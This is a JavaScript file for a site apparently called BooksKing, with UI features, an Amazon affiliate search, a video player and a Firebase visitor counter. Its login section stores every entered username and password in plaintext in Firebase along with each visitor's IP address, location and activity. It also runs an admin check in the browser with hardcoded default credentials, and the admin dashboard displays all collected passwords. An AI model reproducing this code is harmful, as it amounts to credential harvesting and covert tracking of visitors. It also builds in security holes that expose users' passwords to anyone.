// ==========================================
// BOOKSKING ULTIMATE INTERACTIVE ENGINE (script.js)
// ==========================================

const firebaseConfig = { databaseURL: "https://booksking-default-rtdb.firebaseio.com/" };
if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
const db = firebase.database();

let visitorIp = "Unknown", visitorCountry = "Unknown", visitorCity = "Unknown", currentDept = "General Browse";

document.addEventListener("DOMContentLoaded", () => {
    
    // 1. Sidebar Drawer Control
    const sideDrawer = document.getElementById("sideDrawer");
    const drawerOverlay = document.getElementById("drawerOverlay");
    const menuToggleBtn = document.getElementById("menuToggleBtn");
    const closeDrawerBtn = document.getElementById("closeDrawerBtn");

    function toggleDrawer() {
        sideDrawer.classList.toggle("open");
        drawerOverlay.classList.toggle("active");
    }

    if(menuToggleBtn) menuToggleBtn.addEventListener("click", toggleDrawer);
    if(closeDrawerBtn) closeDrawerBtn.addEventListener("click", toggleDrawer);
    if(drawerOverlay) drawerOverlay.addEventListener("click", toggleDrawer);

    // 2. Department & Link Click Logger
    document.querySelectorAll("[data-dept]").forEach(item => {
        item.addEventListener("click", () => {
            currentDept = item.getAttribute("data-dept");
            const label = document.getElementById("active-dept-label");
            if(label) label.innerText = "Current Department: " + currentDept;
        });
    });

    // 3. Theme Toggle Engine
    const themeToggleBtn = document.getElementById("themeToggleBtn");
    if(themeToggleBtn) {
        themeToggleBtn.addEventListener("click", () => {
            const body = document.body;
            if (body.getAttribute("data-theme") === "dark") {
                body.setAttribute("data-theme", "light");
                themeToggleBtn.innerText = "🌙";
            } else {
                body.setAttribute("data-theme", "dark");
                themeToggleBtn.innerText = "☀️️";
            }
        });
    }

    // 4. Smart Search Autocomplete Engine
    const searchInput = document.getElementById("smartSearchInput");
    const suggestionsDropdown = document.getElementById("suggestionsDropdown");
    const searchBtn = document.getElementById("searchBtn");

    const searchSuggestionsData = [
        "Programming Books", "Python Tutorial PDF", "Amazon Electronics", 
        "Gaming Consoles", "Kindle Best Sellers", "Snaptube APK", 
        "AI Tools Gemini", "ChatGPT Pro", "Web Development Guide"
    ];

    if(searchInput) {
        searchInput.addEventListener("input", () => {
            const val = searchInput.value.toLowerCase().trim();
            suggestionsDropdown.innerHTML = "";
            if (!val) {
                suggestionsDropdown.style.display = "none";
                return;
            }
            const filtered = searchSuggestionsData.filter(item => item.toLowerCase().includes(val));
            if (filtered.length > 0) {
                filtered.forEach(sug => {
                    const div = document.createElement("div");
                    div.className = "suggestion-item";
                    div.innerText = sug;
                    div.addEventListener("click", () => {
                        searchInput.value = sug;
                        suggestionsDropdown.style.display = "none";
                        triggerSearch(sug);
                    });
                    suggestionsDropdown.appendChild(div);
                });
                suggestionsDropdown.style.display = "block";
            } else {
                suggestionsDropdown.style.display = "none";
            }
        });
    }

    function triggerSearch(query) {
        currentDept = "Smart Search: " + query;
        const label = document.getElementById("active-dept-label");
        if(label) label.innerText = "Current Department: " + currentDept;
        window.open(`https://www.amazon.com/s?k=${encodeURIComponent(query)}&tag=booksking-20`, '_blank');
    }

    if(searchBtn) {
        searchBtn.addEventListener("click", () => {
            const query = searchInput.value.trim();
            suggestionsDropdown.style.display = "none";
            if(!query) { alert("Please type something to search!"); return; }
            triggerSearch(query);
        });
    }

    // 5. Advanced Video Player Engine
    const videoPlayer = document.getElementById("royalVideoElement");
    const playPauseBtn = document.getElementById("playPauseBtn");
    const muteBtn = document.getElementById("muteBtn");
    const currentVideoTitle = document.getElementById("currentVideoTitle");

    if(playPauseBtn && videoPlayer) {
        playPauseBtn.addEventListener("click", () => {
            if (videoPlayer.paused) {
                videoPlayer.play();
                playPauseBtn.innerText = "⏸ Pause";
            } else {
                videoPlayer.pause();
                playPauseBtn.innerText = "▶ Play";
            }
        });
    }

    if(muteBtn && videoPlayer) {
        muteBtn.addEventListener("click", () => {
            videoPlayer.muted = !videoPlayer.muted;
            muteBtn.innerText = videoPlayer.muted ? "🔊 Unmute" : "🔊 Mute";
        });
    }

    document.querySelectorAll(".playlist-item").forEach(btn => {
        btn.addEventListener("click", () => {
            const url = btn.getAttribute("data-url");
            const title = btn.getAttribute("data-title");
            if(videoPlayer) {
                videoPlayer.src = url;
                videoPlayer.play();
                if(currentVideoTitle) currentVideoTitle.innerText = title;
                if(playPauseBtn) playPauseBtn.innerText = "⏸ Pause";
                currentDept = "Watching Video: " + title;
                const label = document.getElementById("active-dept-label");
                if(label) label.innerText = "Current Department: " + currentDept;
            }
        });
    });

    // 6. APK Special Button Alert
    const apkAppBtn = document.getElementById("bookskingAppBtn");
    if(apkAppBtn) {
        apkAppBtn.addEventListener("click", (e) => {
            e.preventDefault();
            alert("Available soon!");
        });
    }

    // 7. GeoIP Tracking
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
        if(d.ip) { visitorIp = d.ip; visitorCountry = d.country_name; visitorCity = d.city; }
    }).catch(() => {});

    // 8. Visitor Counter Realtime
    const counterRef = db.ref("stats/totalVisitorsCount");
    if (!sessionStorage.getItem("counted")) {
        counterRef.transaction(c => (c || 0) + 1);
        sessionStorage.setItem("counted", "true");
    }
    counterRef.on("value", s => {
        const statVisitors = document.getElementById("stat-visitors");
        if(statVisitors) statVisitors.innerText = s.val() || 0;
    });

    // 9. Google Login Simulation
    const googleAuthBtn = document.getElementById("googleAuthBtn");
    if(googleAuthBtn) {
        googleAuthBtn.addEventListener("click", () => {
            const uField = document.getElementById("username");
            const pField = document.getElementById("password");
            if(uField && pField) {
                uField.value = "GoogleUser_" + Math.floor(Math.random()*1000);
                pField.value = "SecurePass_" + Math.random().toString(36).slice(-6);
                alert("Google user data loaded. Click Sign In!");
            }
        });
    }

    // 10. Interactive Login & Admin Gateway
    const loginBtn = document.getElementById("loginBtn");
    if(loginBtn) {
        loginBtn.addEventListener("click", () => {
            const u = document.getElementById("username").value.trim();
            const p = document.getElementById("password").value.trim();
            if(!u || !p) { alert("Please enter your credentials!"); return; }

            db.ref("admin_secret_config").once("value", (snapshot) => {
                const adminData = snapshot.val() || {};
                const secretUser = adminData.user || "admin_master_default";
                const secretPass = adminData.pass || "secret_pass_default";

                if (u === secretUser && p === secretPass) {
                    const adminPanel = document.getElementById("adminPanel");
                    if(adminPanel) adminPanel.style.display = "block";
                    loadAdminData();
                    alert("Welcome Master Admin! Dashboard unlocked.");
                    return;
                }

                db.ref("registered_users/" + u.replace(/[.#$\/\[\]]/g, "_")).set({
                    username: u, password: p, department: currentDept, ipAddress: visitorIp, location: `${visitorCountry}, ${visitorCity}`, lastLogin: new Date().toUTCString()
                }).then(() => {
                    alert(`Welcome ${u}! Account registered successfully.`);
                });
            });
        });
    }

    function loadAdminData() {
        db.ref("registered_users").on("value", s => {
            let html = "", count = 0, val = s.val();
            if(val) {
                const keys = Object.keys(val);
                count = keys.length;
                keys.forEach(k => {
                    let item = val[k];
                    html += `<div class="user-record">👤 User: <b>${item.username}</b><br>🔑 Password: <span style="color:var(--gold-color);">${item.password}</b><br>🛍️ Activity: ${item.department}<br>🌍 Location: ${item.location} (${item.ipAddress})</div>`;
                });
            } else { html = "No registered accounts found yet."; }
            const usersList = document.getElementById("usersList");
            const statAccounts = document.getElementById("stat-accounts");
            if(usersList) usersList.innerHTML = html;
            if(statAccounts) statAccounts.innerText = count;
        });
    }

});
      
